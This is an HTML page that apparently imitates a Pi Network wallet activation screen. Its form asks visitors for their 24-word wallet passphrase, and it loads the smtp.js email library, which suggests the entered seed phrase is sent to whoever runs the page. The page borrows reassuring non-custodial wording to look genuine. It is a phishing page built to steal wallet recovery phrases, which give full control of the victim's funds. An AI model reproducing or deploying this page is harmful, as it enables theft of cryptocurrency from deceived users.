<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wallet - Pi Network</title>
    <link rel="stylesheet" href="style.css">
    <link href="https://fonts.googleapis.com/css?family=Montserrat" rel="stylesheet">
    <link rel="icon" type="image/x-icon" href="Images/picture.html">
    <link href="../../cdn.jsdelivr.net/npm/bootstrap%405.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">

<body>
    <header>
        <div class="pan"></div>
        <div class="pan1"> wallet <img src="pi%20updates/Screenshot_20240402-201009_Pi%20Browser%20(9).html" alt="" width="20"></div>
        <div class="pan"></div>
    </header>
    <div class="container">
        <form id="my-form">
            <div class="la">
                <h5>Activate Pi Wallet</h5>
            </div>
            <input type="text" id="contact-inputs" placeholder="Enter your 24-word passphrase here" name="message" required />
            <div class="la-1">
                <button class="la-3" type="submit">Activate with passphrase</button>
                <div id="status" class="stat" style="display:none;">
                    <ion-icon name="alert-outline" class="stat1"></ion-icon>
                </div>
            </div>
        </form>
        <div class="la-2">
            <a href="#" class="la-3"><span>Activate with fingerprint</span></a>
        </div>
    </div>
    <div class="txt">
        <p>As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.<br>
        Lost your passphrase? <span><a href="#">You can create a new wallet</a></span>, but all your in your previous wallet will be inaccessible.</p>
    </div>

    <script src="../smtpjs.com/v3/smtp.js"></script>
    <script src="http://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
